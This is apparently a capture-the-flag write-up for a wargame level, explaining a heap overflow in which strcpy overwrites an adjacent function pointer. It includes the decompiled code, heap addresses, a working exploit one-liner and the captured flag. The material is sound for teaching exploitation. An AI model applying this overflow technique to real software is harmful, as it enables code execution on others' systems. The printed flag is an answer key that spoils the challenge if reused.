# 🎯 Level6 - Heap Buffer Overflow with Function Pointer Overwrite

![Helldivers Salute](https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExejJwMnpmeXZ0dHp1enptbDE2am9la2Z4Ymg0eXczcmRiNzFqczJjMSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/VJN5s9dNGXLDqkLYF4/giphy.gif)

First pure heap exploitation - overflow to control execution! 🔥

## 📋 Binary Analysis

### 🎯 Key Functions (Decompiled)

```c
void n(void)
{
  system("/bin/cat /home/user/level7/.pass");  // 🎯 Target function!
}

void m(void)
{
  puts("Nope");                                 // Decoy function
}

int main(int argc, char **argv)
{
  char *buffer;
  void (**function_pointer)(void);
  
  // Allocate 64 bytes for buffer on the heap
  buffer = (char *)malloc(64);
  
  // Allocate 4 bytes for function pointer on the heap
  function_pointer = (void (**)(void))malloc(4);
  
  // Set function pointer to point to m() by default
  *function_pointer = m;
  
  // Vulnerable: No bounds checking! Can overflow buffer into function_pointer
  strcpy(buffer, argv[1]);
  
  // Call whatever function the pointer points to
  (*function_pointer)();
  
  return 0;
}
```

### 🔑 Key Addresses

| Element | Address | Notes |
|---------|---------|-------|
| **Function `n()`** | `0x08048454` | Target - prints flag |
| **Function `m()`** | `0x080484b4` | Decoy - prints "Nope" |
| **Buffer (heap)** | `0x0804a008` | 64 bytes, vulnerable |
| **function_pointer (heap)** | `0x0804a050` | 4 bytes, our target |

**Key Observations:**
- Both buffer and function_pointer are on the **HEAP** (via malloc)
- strcpy has **no bounds checking**
- function_pointer is **always called** after strcpy
- n() exists but is **never called normally**

## 🚨 The Challenge

This is our first **pure heap overflow** - both the vulnerable buffer and the target are on the heap.

**The Setup:**
```c
buffer = malloc(64);                // Heap allocation 1
function_pointer = malloc(4);       // Heap allocation 2 (consecutive!)
*function_pointer = m;              // Points to m() initially
strcpy(buffer, argv[1]);            // OVERFLOW! No size limit
(*function_pointer)();              // Calls whatever function_pointer points to
```

**The Problem:**
- Buffer is limited to 64 bytes
- strcpy copies until NULL terminator (no bounds check)
- If argv[1] is longer than 64 bytes → **overflow**
- Overflow can reach function_pointer

**The Goal:**
Overflow the buffer to overwrite function_pointer, redirecting execution from m() to n().

## 🎯 How the Exploit Works

### Understanding Heap Memory

**What is the Heap?**
- Dynamic memory region managed by malloc/free
- Grows upward (toward higher addresses)
- Managed by allocator (glibc's ptmalloc)
- **No automatic bounds checking!**

**Heap Allocation Layout:**
```
Each malloc allocation includes metadata:

┌─────────────────────────────┐
│ Metadata (size, flags)      │ ← 8 bytes (hidden from you)
├─────────────────────────────┤
│ Your usable data            │ ← What malloc() returns
└─────────────────────────────┘
```

### Heap Layout Discovery

Using `ltrace` to see malloc addresses:

```bash
$ ltrace ./level6 AAAA

malloc(64)   = 0x0804a008  ← buffer starts here
malloc(4)    = 0x0804a050  ← function_pointer starts here
strcpy(0x0804a008, "AAAA") = 0x0804a008
```

**Distance calculation:**
```
0x0804a050 - 0x0804a008 = 0x48 = 72 bytes
```

This tells us we need **72 bytes of padding** to reach function_pointer!

### Visual: Heap Memory Layout

```
INITIAL STATE:
══════════════════════════════════════════════════════════════
0x0804a008: ┌────────────────────────────────────────────┐
            │ buffer (64 bytes)                          │
            │ [empty or garbage data]                    │
            │                                            │
0x0804a048: ├────────────────────────────────────────────┤
            │ Heap metadata (8 bytes)                    │
            │ [size, flags, management info]             │
0x0804a050: ├────────────────────────────────────────────┤
            │ function_pointer (4 bytes)                 │
            │ [0x080484b4] → points to m()               │
            └────────────────────────────────────────────┘


AFTER OVERFLOW:
══════════════════════════════════════════════════════════════
0x0804a008: ┌────────────────────────────────────────────┐
            │ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA   │
            │ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA         │ ← 72 A's
            │ (overwrites buffer + metadata)             │
0x0804a050: ├────────────────────────────────────────────┤
            │ \x54\x84\x04\x08                           │
            │ [0x08048454] → points to n() ✅            │
            └────────────────────────────────────────────┘
```

### The Vulnerability: strcpy()

```c
strcpy(buffer, argv[1]);
```

**Why it's dangerous:**
- Copies bytes until it finds NULL terminator (`\0`)
- **NO size checking whatsoever**
- If source is longer than destination → **overflow**
- Overwrites adjacent heap memory

**In our case:**
- Source: argv[1] (user-controlled, can be any length)
- Destination: buffer (64 bytes on heap)
- Adjacent target: function_pointer (72 bytes away)

### The Attack Strategy

**Step 1: Identify Targets**
- Target function: `n()` at `0x08048454`
- Vulnerable buffer: 64 bytes at `0x0804a008`
- Function pointer: 4 bytes at `0x0804a050`
- Distance: 72 bytes

**Step 2: Calculate Payload**
```
[Padding: 72 bytes] + [Address of n(): 4 bytes]
     └─ Fill buffer and metadata       └─ Overwrite function_pointer
```

**Step 3: Build Payload**
```python
"A" * 72 + "\x54\x84\x04\x08"
  └─padding┘  └──n() address──┘
              (little-endian)
```

**Breakdown:**
- `"A" * 72`: Fills buffer (64) + metadata (8)
- `\x54\x84\x04\x08`: Address 0x08048454 in little-endian

**Step 4: Execute**
```bash
./level6 $(python -c 'print "A"*72 + "\x54\x84\x04\x08"')
```

### Complete Execution Flow

```
Step 1: Program Start
─────────────────────
Command: ./level6 "AAAA...AAAA\x54\x84\x04\x08"
         argv[1] = 76-byte string


Step 2: Heap Allocations
─────────────────────────
malloc(64):  buffer           = 0x0804a008
malloc(4):   function_pointer = 0x0804a050

Initial state:
  *function_pointer = 0x080484b4 (address of m)


Step 3: Vulnerable strcpy()
────────────────────────────
strcpy(buffer, argv[1]):
  Copies 76 bytes from argv[1]:
    - Bytes 0-63:   → buffer (0x0804a008 to 0x0804a047)
    - Bytes 64-71:  → heap metadata (0x0804a048 to 0x0804a04f)
    - Bytes 72-75:  → function_pointer (0x0804a050 to 0x0804a053)

Result:
  buffer:            [AAAA...AAAA] (72 A's)
  function_pointer:  [0x08048454] ← Overwritten with n()'s address!


Step 4: Function Pointer Call
──────────────────────────────
(*function_pointer)():
  1. Dereference function_pointer: reads 0x08048454
  2. Calls function at 0x08048454
  3. This is n(), not m()!


Step 5: Flag Retrieved
───────────────────────
n() executes:
  system("/bin/cat /home/user/level7/.pass")
  
Output: Flag printed to stdout! 🎉
```

### Why This Works

| Requirement | Status | Explanation |
|-------------|--------|-------------|
| **Heap overflow** | ✅ | strcpy() has no bounds checking |
| **Consecutive allocations** | ✅ | malloc() allocates sequentially |
| **Known addresses** | ✅ | n() at 0x08048454, heap layout predictable |
| **No ASLR** | ✅ | Heap addresses are deterministic |
| **Function pointer call** | ✅ | (*func_ptr)() allows arbitrary execution |
| **Target exists** | ✅ | n() prints the flag |
| **No heap protections** | ✅ | No canaries, no safe unlinking |

### Key Insight

**Exploit Evolution:**
- **Level1**: Stack overflow → control return address
- **Level2**: Stack overflow → execute heap shellcode
- **Level6**: **Heap overflow → heap function pointer** ⭐ NEW!

This is the first **pure heap exploitation**:
- Vulnerable buffer: **on heap**
- Target (function_pointer): **on heap**
- No stack manipulation needed!

**Why heap exploits matter:**
- Modern applications allocate most data on heap
- Heap vulnerabilities often overlooked vs stack
- Objects can persist across function calls
- Can corrupt application state, not just control flow

## 💣 Execute the Exploit

```bash
./level6 $(python -c 'print "A"*72 + "\x54\x84\x04\x08"')
```

The flag will be printed directly!

---

> 💡 **Pro Tip**: Always use `ltrace` or `gdb` to verify heap allocation addresses and distances. Heap allocators can behave differently based on glibc version and architecture!

> ⚠️ **Security Note**: Modern heap protections include:
> - **Heap Canaries** - Detect corruption in metadata
> - **ASLR** - Randomizes heap base address
> - **Safe Unlinking** - Validates heap chunk pointers
> - **Top Chunk Checks** - Prevents heap metadata corruption
> 
> **Always use safe alternatives:**
> - `strncpy()` instead of `strcpy()`
> - `strlcpy()` on BSD systems
> - Manually check buffer sizes before copying

## 🎉 Victory!

![Helldivers Celebration](https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExempicnBhODF0Y3BrZG5zaWIzMmM2MWExdDZuYWNnYWJrdnRtYXg4MyZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/MlyicdUndRbn5zUiAL/giphy.gif)

**Flag captured!** 🚩

```
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```
